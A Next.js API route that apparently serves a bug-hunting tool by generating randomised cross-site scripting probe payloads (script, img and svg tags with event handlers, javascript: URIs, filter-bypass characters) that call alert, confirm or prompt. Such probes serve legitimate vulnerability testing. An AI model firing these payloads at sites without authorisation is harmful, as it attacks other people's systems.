import { NextResponse, type NextRequest } from "next/server";

// This logic is inspired by payload generation techniques.
// Owner: BugHunter Pro Team (Your Website Name)

const tags = ["script", "img", "svg", "a", "body", "iframe", "div", "video", "audio", "details"];
const events = [
    "onload", "onerror", "onmouseover", "onclick", "onfocus", "onblur", "onscroll", 
    "onchange", "onsubmit", "onresize", "onpageshow", "onmouseout", "onmousemove"
];
const functions = ["alert(1)", "alert('XSS')", "confirm(1)", "prompt(1)", "console.log('XSS')"];
const bypasses = ["//", "/**/", "`", "'", "\""];

function generatePayloads(count = 10) {
    const payloads = new Set<string>();

    while (payloads.size < count) {
        const tag = tags[Math.floor(Math.random() * tags.length)];
        const event = events[Math.floor(Math.random() * events.length)];
        const func = functions[Math.floor(Math.random() * functions.length)];
        const bypass = bypasses[Math.floor(Math.random() * bypasses.length)];
        let payload = "";

        const type = Math.floor(Math.random() * 4);

        switch(type) {
            case 0: // Tag-based payload
                payload = `<${tag} ${event}=${func}>`;
                break;
            case 1: // Tag-based with bypass
                payload = `<${tag}${bypass}${event}=${func}>`;
                break;
            case 2: // JavaScript URI scheme
                payload = `javascript:${bypass}${func}`;
                break;
            case 3: // Simple script tag
                payload = `<script>${bypass}${func}${bypass}</script>`;
                break;
        }
        payloads.add(payload);
    }

    return Array.from(payloads);
}


export async function POST(request: NextRequest) {
  try {
    const { count = 50 } = await request.json();
    const payloadCount = Math.min(Number(count) || 50, 100); // Max 100 payloads per request

    const payloads = generatePayloads(payloadCount);

    return NextResponse.json({
      payloads,
      generatedAt: new Date().toISOString(),
    });
  } catch (error) {
    return NextResponse.json({ error: "Failed to generate payloads" }, { status: 500 });
  }
}
